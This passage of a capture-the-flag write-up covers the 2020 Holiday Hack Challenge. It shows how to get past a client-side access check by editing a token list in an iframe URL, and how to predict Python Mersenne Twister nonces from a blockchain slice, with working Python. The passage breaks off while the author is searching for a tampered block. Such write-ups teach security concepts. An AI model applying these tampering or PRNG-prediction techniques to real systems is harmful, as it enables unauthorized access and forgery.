    <span class="nx">contentType</span><span class="o">:</span> <span class="s1">&#39;application/json&#39;</span><span class="p">,</span>
    <span class="nx">data</span><span class="o">:</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span>
      <span class="nx">targetFloor</span><span class="p">,</span>
      <span class="nx">id</span><span class="o">:</span> <span class="nx">getParams</span><span class="p">.</span><span class="nx">id</span><span class="p">,</span>
    <span class="p">}),</span>
    <span class="nx">success</span><span class="o">:</span> <span class="p">(</span><span class="nx">res</span><span class="p">,</span> <span class="nx">status</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span><span class="nx">res</span><span class="p">.</span><span class="nx">hash</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">__POST_RESULTS__</span><span class="p">({</span>
          <span class="nx">resourceId</span><span class="o">:</span> <span class="nx">getParams</span><span class="p">.</span><span class="nx">id</span> <span class="o">||</span> <span class="s1">&#39;1111&#39;</span><span class="p">,</span>
          <span class="nx">hash</span><span class="o">:</span> <span class="nx">res</span><span class="p">.</span><span class="nx">hash</span><span class="p">,</span>
          <span class="nx">action</span><span class="o">:</span> <span class="sb">`goToFloor-</span><span class="si">${</span><span class="nx">targetFloor</span><span class="si">}</span><span class="sb">`</span><span class="p">,</span>
        <span class="p">});</span>
      <span class="p">}</span>
    <span class="p">}</span>
  <span class="p">});</span>
<span class="p">}</span>
</code></pre></div><p>And handleBtn4:</p>
<div class="highlight"><pre class="chroma"><code class="language-js" data-lang="js"><span class="kr">const</span> <span class="nx">handleBtn4</span> <span class="o">=</span> <span class="p">()</span> <span class="p">=&gt;</span> <span class="p">{</span>
  <span class="kr">const</span> <span class="nx">cover</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">querySelector</span><span class="p">(</span><span class="s1">&#39;.print-cover&#39;</span><span class="p">);</span>
  <span class="nx">cover</span><span class="p">.</span><span class="nx">classList</span><span class="p">.</span><span class="nx">add</span><span class="p">(</span><span class="s1">&#39;open&#39;</span><span class="p">);</span>

  <span class="nx">cover</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s1">&#39;click&#39;</span><span class="p">,</span> <span class="p">()</span> <span class="p">=&gt;</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="nx">btn4</span><span class="p">.</span><span class="nx">classList</span><span class="p">.</span><span class="nx">contains</span><span class="p">(</span><span class="s1">&#39;powered&#39;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">hasToken</span><span class="p">(</span><span class="s1">&#39;besanta&#39;</span><span class="p">))</span> <span class="p">{</span>
      <span class="nx">$</span><span class="p">.</span><span class="nx">ajax</span><span class="p">({</span>
        <span class="nx">type</span><span class="o">:</span> <span class="s1">&#39;POST&#39;</span><span class="p">,</span>
        <span class="nx">url</span><span class="o">:</span> <span class="nx">POST_URL</span><span class="p">,</span>
        <span class="nx">dataType</span><span class="o">:</span> <span class="s1">&#39;json&#39;</span><span class="p">,</span>
        <span class="nx">contentType</span><span class="o">:</span> <span class="s1">&#39;application/json&#39;</span><span class="p">,</span>
        <span class="nx">data</span><span class="o">:</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span>
          <span class="nx">targetFloor</span><span class="o">:</span> <span class="s1">&#39;3&#39;</span><span class="p">,</span>
          <span class="nx">id</span><span class="o">:</span> <span class="nx">getParams</span><span class="p">.</span><span class="nx">id</span><span class="p">,</span>
        <span class="p">}),</span>
        <span class="nx">success</span><span class="o">:</span> <span class="p">(</span><span class="nx">res</span><span class="p">,</span> <span class="nx">status</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
          <span class="k">if</span> <span class="p">(</span><span class="nx">res</span><span class="p">.</span><span class="nx">hash</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">__POST_RESULTS__</span><span class="p">({</span>
              <span class="nx">resourceId</span><span class="o">:</span> <span class="nx">getParams</span><span class="p">.</span><span class="nx">id</span> <span class="o">||</span> <span class="s1">&#39;1111&#39;</span><span class="p">,</span>
              <span class="nx">hash</span><span class="o">:</span> <span class="nx">res</span><span class="p">.</span><span class="nx">hash</span><span class="p">,</span>
              <span class="nx">action</span><span class="o">:</span> <span class="s1">&#39;goToFloor-3&#39;</span><span class="p">,</span>
            <span class="p">});</span>
          <span class="p">}</span>
        <span class="p">}</span>
      <span class="p">});</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
      <span class="nx">__SEND_MSG__</span><span class="p">({</span>
        <span class="nx">type</span><span class="o">:</span> <span class="s1">&#39;sfx&#39;</span><span class="p">,</span>
        <span class="nx">filename</span><span class="o">:</span> <span class="s1">&#39;error.mp3&#39;</span><span class="p">,</span>
      <span class="p">});</span>
    <span class="p">}</span>
  <span class="p">});</span>
<span class="p">};</span>
</code></pre></div><p>The only difference between the two handlers is the check before actually making the POST request:</p>
<div class="highlight"><pre class="chroma"><code class="language-js" data-lang="js">    <span class="k">if</span> <span class="p">(</span><span class="nx">btn4</span><span class="p">.</span><span class="nx">classList</span><span class="p">.</span><span class="nx">contains</span><span class="p">(</span><span class="s1">&#39;powered&#39;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">hasToken</span><span class="p">(</span><span class="s1">&#39;besanta&#39;</span><span class="p">))</span> <span class="p">{</span>
</code></pre></div><p>It verifies that:</p>
<ol>
<li>The Santa&rsquo;s Office button is powered on</li>
<li><code>besanta</code> is in the the list of tokens</li>
</ol>
<p>Using the developer tools in Chrome, we can inspect the source code:</p>
<p><img src="img/image-20210102113011942.png" alt="image-20210102113011942"></p>
<p>and notice that the list of tokens is provided directly in the URL of the iframe.</p>
<p>Double-click on it to edit it, and add <code>,besanta</code> at the end of URL:</p>
<div class="highlight"><pre class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">title</span><span class="o">=</span><span class="s">&#34;challenge&#34;</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;https://elevator.kringlecastle.com?challenge=elevatorr&amp;amp;id=73473f84-7ceb-4547-a923-2e970aaa9e8e&amp;amp;username=kylma&amp;amp;area=santavator5&amp;amp;location=1,2&amp;amp;tokens=marble,nut2,nut,candycane,ball,yellowlight,elevator-key,greenlight,redlight,workshop-button,besanta&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
</code></pre></div><p>You can now activate the fingerprint scanner without any complaints. Well, apart from Tinsel Upatree who&rsquo;s flabbergasted:</p>
<blockquote>
<p>GOSHGOLLY
How did you get in here??
I mean, hey, I&rsquo;m impressed you made it in here, but you&rsquo;ve got to leave!
Breaking into Santa&rsquo;s office might mean immediate membership on the wrong side of the Naughty/Nice List.</p>
</blockquote>
<p>But you still can&rsquo;t access the Naughty/Nice list on Santa&rsquo;s desk:</p>
<blockquote>
<p>Santa&rsquo;s Naughty/Nice List is for Santa and Elf Ethicists only.</p>
</blockquote>
<h2 id="11a-naughtynice-list-with-blockchain-investigation-part-1-">11a. Naughty/Nice List with Blockchain Investigation Part 1 🎄🎄🎄🎄🎄</h2>
<p>Description:</p>
<blockquote>
<p>Even though the chunk of the blockchain that you have ends with block 129996, can you predict the nonce for block 130000? Talk to Tangle Coalbox in the Speaker UNpreparedness Room for tips on prediction and Tinsel Upatree for more tips and <a href="https://download.holidayhackchallenge.com/2020/OfficialNaughtyNiceBlockchainEducationPack.zip">tools</a>. (Enter just the 16-character hex value of the nonce)</p>
</blockquote>
<p>Tangle Coalbox:</p>
<blockquote>
<p>Howdy Boss. You look a tad flushed.
Can I get you some water from the vending machine?
I&rsquo;m still looking into the Snowball Game like you asked.
I read the write-up of the test completed earlier this summer with the web socket vulnerabilities.
I was able to complete the Easy level, but the Impossible level is, umm&hellip;
I&rsquo;d call it impossible, but I just saw someone beat it!
Is it possible that the name a player provides influences how the forts are laid out?
Oh, oh, maybe if I feed a Hard name into an Easy game I can manipulate it!
UGH! on Impossible, the best I get are rejected player names in the page comments&hellip; maybe that&rsquo;s useful?
I&rsquo;ll have to re-watch Tom Liston&rsquo;s <a href="https://www.youtube.com/watch?v=Jo5Nlbqd-Vg">talk</a> again.
Thanks for all the tips and encouragement Santa!</p>
</blockquote>
<p>Tinsel Upatree:</p>
<blockquote>
<p>Howdy Santa! Just guarding the Naughty/Nice list on your desk.
Santa, I don&rsquo;t know if you&rsquo;ve heard, but something is very, very wrong&hellip;
We tabulated the latest score of the Naughty/Nice Blockchain.
Jack Frost is the nicest being in the world! Jack Frost!?!
As you know, we only really start checking the Naughty/Nice totals as we get closer to the holidays.
Out of nowhere, Jack Frost has this crazy score&hellip; positive 4,294,935,958 nice points!
No one has EVER gotten a score that high! No one knows how it happened.
Most of us recall Jack having a NEGATIVE score only a few days ago&hellip;
Worse still, his huge positive score seems to have happened way back in March.
Our first thought was that he somehow changed the blockchain - but, as you know, that isn&rsquo;t possible.
We ran a validation of the blockchain and it all checks out.
Even the smallest change to any block should make it invalid.
Blockchains are huge, so we cut a one minute chunk from when Jack&rsquo;s big score registered back in March.
You can get a slice of the Naughty/Nice blockchain on your desk.
You can get some <a href="https://download.holidayhackchallenge.com/2020/OfficialNaughtyNiceBlockchainEducationPack.zip">tools to help you here</a>.
Tangle Coalbox, in the Speaker UNPreparedness room. has been talking with attendees about the issue.</p>
</blockquote>
<h3 id="solution-11">Solution</h3>
<p>We get a <code>OfficialNaughtyNiceBlockchainEducationPack.zip</code>,</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">$ tree OfficialNaughtyNiceBlockchainEducationPack
OfficialNaughtyNiceBlockchainEducationPack
├── Dockerfile
├── docker.sh
├── naughty_nice.py
├── official_public.pem
└── private.pem

0 directories, 5 files
</code></pre></div><p>I&rsquo;m going to ignore the Dockerfile and docker.sh as I already have <code>pycryptodome</code> installed on my machine. If not, you can run <code>pip install --user pycryptodome</code> to install it.</p>
<p>Let&rsquo;s have a look at the rest of the files:</p>
<ul>
<li>
<p><code>naughty_nice.py</code> is the main script and has a whole book in the comment of the script, it&rsquo;s a must read as it contains lots of useful information and will help you understand how the blockchain works.</p>
</li>
<li>
<p><code>official_public.pem</code> the public key to verify the signature of the blockchain.</p>
</li>
<li>
<p><code>private.pem</code> an example private key (also bundling the public key) that can be used for your own blockchain tests.</p>
</li>
</ul>
<p>Alright, we have some hints that we should take a look at how Mersenne Twister works and how it affects the randomness of the generated numbers. Mersenne Twister is the pseudo-random number generator used by the random module in Python.</p>
<p>So first, we can start looking for places in the code where functions from the random modules are used:</p>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="bp">self</span><span class="o">.</span><span class="n">nonce</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">randrange</span><span class="p">(</span><span class="mh">0xFFFFFFFFFFFFFFFF</span><span class="p">)</span>
</code></pre></div><p>And we have some more information about the nonce in the comments:</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">In addition to this built-in property of a blockchain, the Official Naughty/Nice Blockchain has a few
other safeguards. The cryptographic hash of each block is signed using the Official Santa Signature
System (OS3). Currently, the Official Naughty/Nice Blockchain uses MD5 as its hashing algorithm, but
plans are in place to move to SHA256 in 2021. This update is part of a phased process to modernize
the blockchain code. In 2019, the entire blockchain system was ported from the original COBOL code to
Python3. Because of concerns about hash collisions in MD5, in the new Python3 code, a 64-bit random
&#34;nonce&#34; was added to the beginning of each block at the time of creation.
</code></pre></div><p>Note: <code>random.seed()</code> is never called, so the default seed is used ie the current system time.</p>
<p>There&rsquo;s just one tiny problem with Mersenne-Twister: it&rsquo;s possible to create a predictor that will produce the same output of numbers than the one used by the nonce if we have enough data, ie 624 random numbers.</p>
<p>I used this library for building the predictor: <a href="https://github.com/kmyk/mersenne-twister-predictor">https://github.com/kmyk/mersenne-twister-predictor</a> which I found easier to work with.</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">pip install --user mersenne-twister-predictor
</code></pre></div><h4 id="nonce-32-bit-vs-nonce-64-bit">Nonce 32-bit vs nonce 64-bit</h4>
<p>But there&rsquo;s a problem, that library can only predict 32-bit numbers&hellip; And the nonces are random 64-bit numbers.</p>
<p>Let&rsquo;s take a look at how Python would generate a 64-bit random number. From <a href="https://ctftime.org/writeup/14939">this writeup</a>, I learned that a 64-bit random number is nothing more than 2 32-bit random numbers smashed together!</p>
<p>This code generating a 64-bit random number:</p>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python">    <span class="kn">import</span> <span class="nn">random</span>

    <span class="c1"># use a fixed seed for debug</span>
    <span class="n">random</span><span class="o">.</span><span class="n">seed</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>

    <span class="n">r1</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">getrandbits</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="n">r1</span><span class="p">)</span>
</code></pre></div><p>is actually equivalent this code smashing two 32-bit random numbers together:</p>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python">    <span class="kn">import</span> <span class="nn">random</span>

    <span class="c1"># use a fixed seed for debug</span>
    <span class="n">random</span><span class="o">.</span><span class="n">seed</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>

    <span class="n">r1</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">getrandbits</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span>
    <span class="n">r2</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">getrandbits</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span>
    <span class="n">nonce</span> <span class="o">=</span> <span class="p">(</span><span class="n">r2</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="p">)</span> <span class="o">|</span>  <span class="n">r1</span>
    <span class="k">print</span><span class="p">(</span><span class="n">nonce</span><span class="p">)</span>
</code></pre></div><p>This means that we can write function to convert a 64-bit nonce into two 32-bit nonce:</p>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">n64_to_n32</span><span class="p">(</span><span class="n">nonce</span><span class="p">):</span>
    <span class="n">n2</span> <span class="o">=</span> <span class="n">nonce</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span>
    <span class="n">n1</span> <span class="o">=</span> <span class="p">(</span><span class="n">n2</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="p">)</span> <span class="o">^</span> <span class="n">nonce</span>

    <span class="k">return</span> <span class="n">n1</span><span class="p">,</span> <span class="n">n2</span>

<span class="k">def</span> <span class="nf">n32_to_n64</span><span class="p">(</span><span class="n">n1</span><span class="p">,</span> <span class="n">n2</span><span class="p">):</span>
    <span class="n">nonce</span> <span class="o">=</span> <span class="p">(</span><span class="n">n2</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="p">)</span> <span class="o">|</span> <span class="n">n1</span>

    <span class="k">return</span> <span class="n">nonce</span>
</code></pre></div><p>Alright, here&rsquo;s the rest of the battleplan:</p>
<ol>
<li>
<p>Extract the 64-bit nonces from the blockchain</p>
</li>
<li>
<p>Seed a Mersenne Twister predictor</p>
</li>
<li>
<p>Predict 64-bit nonces with the 32-bit nonces from the Mersenne Twister predictor</p>
</li>
</ol>
<h4 id="extract-the-64-bit-nonces-from-the-blockchain">Extract the 64-bit nonces from the blockchain</h4>
<p>Python makes it pretty easy:</p>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">obj11a</span><span class="p">():</span>
	<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;official_public.pem&#39;</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">fh</span><span class="p">:</span>
        <span class="n">official_public_key</span> <span class="o">=</span> <span class="n">RSA</span><span class="o">.</span><span class="n">importKey</span><span class="p">(</span><span class="n">fh</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>

    <span class="c1"># load the chain from the blockchain.dat file</span>
    <span class="n">chain</span> <span class="o">=</span> <span class="n">Chain</span><span class="p">(</span><span class="n">load</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">filename</span><span class="o">=</span><span class="s1">&#39;blockchain.dat&#39;</span><span class="p">)</span>

    <span class="c1"># go through the chain and build the list of 64-bit nonces</span>
    <span class="n">nonces64bit</span> <span class="o">=</span> <span class="p">[</span><span class="n">block</span><span class="o">.</span><span class="n">nonce</span> <span class="k">for</span> <span class="n">block</span> <span class="ow">in</span> <span class="n">chain</span><span class="o">.</span><span class="n">blocks</span><span class="p">]</span>
</code></pre></div><h4 id="seed-a-mersenne-twister-predictor">Seed a Mersenne Twister Predictor</h4>
<p>Next, we create a Mersenne Twister Predictor. We extract two 32-bit nonces for each 64-bit nonce from our previous list. The 32-bit nonces are used to seed the Mersenne Twister Predictor and also saved to a list. And we repeat that operation until we have 624 of them, the minimum to be able to predict.</p>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="c1"># list of extract 32-bit nonces</span>
    <span class="n">nonces32bit</span> <span class="o">=</span> <span class="p">[]</span>

    <span class="c1"># create a generator</span>
    <span class="n">predictor</span> <span class="o">=</span> <span class="n">MT19937Predictor</span><span class="p">()</span>

    <span class="c1"># seed it with 624 32bit nonces that we extracted from the 64bit nonces</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">624</span> <span class="o">//</span> <span class="mi">2</span><span class="p">):</span>
        <span class="n">n1</span><span class="p">,</span> <span class="n">n2</span> <span class="o">=</span> <span class="n">n64_to_n32</span><span class="p">(</span><span class="n">nonces64bit</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
        <span class="n">predictor</span><span class="o">.</span><span class="n">setrandbits</span><span class="p">(</span><span class="n">n1</span><span class="p">,</span> <span class="mi">32</span><span class="p">)</span>
        <span class="n">predictor</span><span class="o">.</span><span class="n">setrandbits</span><span class="p">(</span><span class="n">n2</span><span class="p">,</span> <span class="mi">32</span><span class="p">)</span>
        <span class="n">nonces32bit</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">n1</span><span class="p">)</span>
        <span class="n">nonces32bit</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">n2</span><span class="p">)</span>
</code></pre></div><p>Our predictor is now ready to use ~~</p>
<h4 id="predict-64-bit-nonces">Predict 64-bit nonces</h4>
<p>We predict a whole bunch of 32-bit nonces to expand our nonces32bit list:</p>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="n">nb_of_predictions</span> <span class="o">=</span> <span class="mi">4000</span>
    <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s2">&#34;predicting {624+nb_of_predictions} nonces32bit&#34;</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">nb_of_predictions</span><span class="p">):</span>
        <span class="n">nonces32bit</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">predictor</span><span class="o">.</span><span class="n">getrandbits</span><span class="p">(</span><span class="mi">32</span><span class="p">))</span>
</code></pre></div><p>And now, we can rebuild 64-bit nonces for any index, with the function we wrote earlier:</p>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="n">predicted_nonce64</span> <span class="o">=</span> <span class="n">n32_to_n64</span><span class="p">(</span><span class="n">n1</span><span class="p">,</span> <span class="n">n2</span><span class="p">)</span>
</code></pre></div><p>We&rsquo;re starting at index 1540 so we can verify that our predicted 64-bit nonce are identical to the 64-bit nonces extracted from index 1540 to 1547. And then we predict 4 more 64-bit nonces:</p>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"> <span class="n">start</span> <span class="o">=</span> <span class="mi">1540</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">2</span><span class="p">):</span>
        <span class="n">n1</span> <span class="o">=</span> <span class="n">nonces32bit</span><span class="p">[</span><span class="n">start</span> <span class="o">*</span> <span class="mi">2</span> <span class="o">-</span> <span class="mi">1</span> <span class="o">+</span> <span class="n">i</span><span class="p">]</span>
        <span class="n">n2</span> <span class="o">=</span> <span class="n">nonces32bit</span><span class="p">[</span><span class="n">start</span> <span class="o">*</span> <span class="mi">2</span> <span class="o">+</span> <span class="n">i</span><span class="p">]</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">currentnonce64</span> <span class="o">=</span> <span class="n">nonces64bit</span><span class="p">[</span><span class="n">start</span> <span class="o">+</span> <span class="n">i</span> <span class="o">//</span> <span class="mi">2</span><span class="p">]</span>
        <span class="k">except</span><span class="p">:</span>
            <span class="n">currentnonce64</span> <span class="o">=</span> <span class="bp">None</span>
        <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s2">&#34;index {start + i//2} predicted nonce64 {n32_to_n64(n1, n2)} {currentnonce64} nonce64value &#34;</span><span class="p">)</span>
</code></pre></div><p>So the nonce of the block 130000 (ie index 1551) is:</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">index 1551 predicted nonce64 6270808489970332317 None nonce64value
</code></pre></div><p>The full Python script can be downloaded <a href="scripts/naughty_nice.py">here</a>.</p>
<p>Now, we just need to transform that into hex:</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">&gt;&gt;&gt; hex(6270808489970332317)
&#39;0x57066318f32f729d&#39;
</code></pre></div><p>Flag: <code>57066318f32f729d</code></p>
<p>Resources:</p>
<ul>
<li><a href="https://en.wikipedia.org/wiki/Mersenne_Twister">https://en.wikipedia.org/wiki/Mersenne_Twister</a></li>
<li><a href="https://github.com/kmyk/mersenne-twister-predictor">https://github.com/kmyk/mersenne-twister-predictor</a></li>
<li><a href="https://eldipa.github.io/book-of-gehn/articles/2018/12/23/Mersenne-Twister-PRNG.html">https://eldipa.github.io/book-of-gehn/articles/2018/12/23/Mersenne-Twister-PRNG.html</a></li>
</ul>
<h2 id="11b-naughtynice-list-with-blockchain-investigation-part-2-">11b. Naughty/Nice List with Blockchain Investigation Part 2 🎄🎄🎄🎄🎄</h2>
<p>Description:</p>
<blockquote>
<p>The SHA256 of Jack&rsquo;s altered block is: 58a3b9335a6ceb0234c12d35a0564c4e f0e90152d0eb2ce2082383b38028a90f. If you&rsquo;re clever, you can recreate the original version of that block by changing the values of only 4 bytes. Once you&rsquo;ve recreated the original block, what is the SHA256 of that block?</p>
</blockquote>
<h3 id="solution-12">Solution</h3>
<h4 id="signature-checking">Signature Checking</h4>
<p>My first idea was that, if Jack has altered the blockchain, then it&rsquo;s no longer valid (because he can&rsquo;t sign it without the official private key). So the altered block should be one with a bad signature.</p>
<p>Let&rsquo;s try to verify the integrity of the whole <code>blockchain.dat</code> we got. We can uncomment the source code in the main function for that:</p>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="c1"># Note: This is how you would load and verify a blockchain contained in a file called blockchain.dat</span>

    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;official_public.pem&#39;</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">fh</span><span class="p">:</span>
        <span class="n">official_public_key</span> <span class="o">=</span> <span class="n">RSA</span><span class="o">.</span><span class="n">importKey</span><span class="p">(</span><span class="n">fh</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
    <span class="n">c2</span> <span class="o">=</span> <span class="n">Chain</span><span class="p">(</span><span class="n">load</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">filename</span><span class="o">=</span><span class="s1">&#39;blockchain.dat&#39;</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="s1">&#39;C2: Block chain verify: </span><span class="si">%s</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">c2</span><span class="o">.</span><span class="n">verify_chain</span><span class="p">(</span><span class="n">official_public_key</span><span class="p">)))</span>
    <span class="k">print</span><span class="p">(</span><span class="n">c2</span><span class="o">.</span><span class="n">blocks</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
    <span class="n">c2</span><span class="o">.</span><span class="n">blocks</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">dump_doc</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</code></pre></div><p>Running it says that the block <code>128449</code> &rsquo;s signature is bad, is this the altered block?</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ ./naughty_nice.py
*** WARNING *** Wrong previous <span class="nb">hash</span> at block 128449.

*** WARNING *** Blockchain invalid from block <span class="m">128449</span> onward.

C2: Block chain verify: False
Chain Index: <span class="m">128449</span>
              Nonce: e3e12de5edfb51e2
                PID: 0803508ada0a5ebf
                RID: aecbf777616d9fa4
     Document Count: <span class="m">1</span>
              Score: 000000dc <span class="o">(</span>220<span class="o">)</span>
               Sign: <span class="m">1</span> <span class="o">(</span>Nice<span class="o">)</span>
         Data item: <span class="m">1</span>
               Data Type: <span class="m">05</span> <span class="o">(</span>PDF<span class="o">)</span>
             Data Length: 000003a7
                    Data: b<span class="s1">&#39;255044462d312 [...] 454f460a0a&#39;</span>
               Date: 03/24
               Time: 13:21:00
       PreviousHash: c6e2e6ecb785e7132c8003ab5aaba88d
  Data Hash to Sign: 03cfb11504b8eee93b26aeb0d8ac39ff
          Signature: b<span class="s1">&#39;PT4OZUq+ [...] /mN2uUzmQ==&#39;</span>

Document dumped as: 128449.pdf
</code></pre></div><p>Not exactly. The signature verification fails on the first block. The trouble is, we need a different way of verifying the blockchain because we only have a chunk of it, not the whole blockchain. The documentation mentions an additional argument to verify the blockchain when you don&rsquo;t have the beginning (the genesis block). We need to tell <code>verify_chain</code> to use the <code>PreviousHash</code> field of the block 0 as starting point:</p>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;official_public.pem&#39;</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">fh</span><span class="p">:</span>
        <span class="n">official_public_key</span> <span class="o">=</span> <span class="n">RSA</span><span class="o">.</span><span class="n">importKey</span><span class="p">(</span><span class="n">fh</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
    <span class="n">c2</span> <span class="o">=</span> <span class="n">Chain</span><span class="p">(</span><span class="n">load</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">filename</span><span class="o">=</span><span class="s1">&#39;blockchain.dat&#39;</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="s1">&#39;C2: Block chain verify: </span><span class="si">%s</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">c2</span><span class="o">.</span><span class="n">verify_chain</span><span class="p">(</span><span class="n">official_public_key</span><span class="p">,</span> <span class="s2">&#34;c6e2e6ecb785e7132c8003ab5aaba88d&#34;</span><span class="p">)))</span>
</code></pre></div><p>And our block chain is now verified /o/</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">C2: Block chain verify: True
</code></pre></div><p>But wait. I thought we were going to find the altered block with this method? Let&rsquo;s go back to square one, the description gives us the SHA-256 of the altered block: <code>58a3b9335a6ceb0234c12d35a0564c4e f0e90152d0eb2ce2082383b38028a90f</code>, why not compute the SHA-256 of every block until we have one that is identical.</p>
<h4 id="finding-the-altered-block">Finding the Altered Block</h4>
<p>The Block class already has a <code>full_hash</code> method that compute the MD5 of the block. Let&rsquo;s copy it and modify it to use SHA256 (bonus: SHA256 is even already imported in the script):</p>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">Crypto.Hash</span> <span class="kn">import</span> <span class="n">MD5</span><span class="p">,</span> <span class="n">SHA256</span>

<span class="k">class</span> <span class="nc">Block</span>
<span class="p">[</span><span class="o">...</span><span class="p">]</span>
    <span class="k">def</span> <span class="nf">full_hash</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="n">hash_obj</span> <span class="o">=</span> <span class="n">MD5</span><span class="o">.</span><span class="n">new</span><span class="p">()</span>
        <span class="n">hash_obj</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">block_data_signed</span><span class="p">())</span>
        <span class="k">return</span> <span class="n">hash_obj</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>

    <span class="k">def</span> <span class="nf">full_hash_SHA256</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="n">hash_obj</span> <span class="o">=</span> <span class="n">SHA256</span><span class="o">.</span><span class="n">new</span><span class="p">()</span>
        <span class="n">hash_obj</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">block_data_signed</span><span class="p">())</span>
        <span class="k">return</span> <span class="n">hash_obj</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
</code></pre></div><p>We compute all SHA-256 and find the matching block:</p>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">obj11b</span><span class="p">():</span>
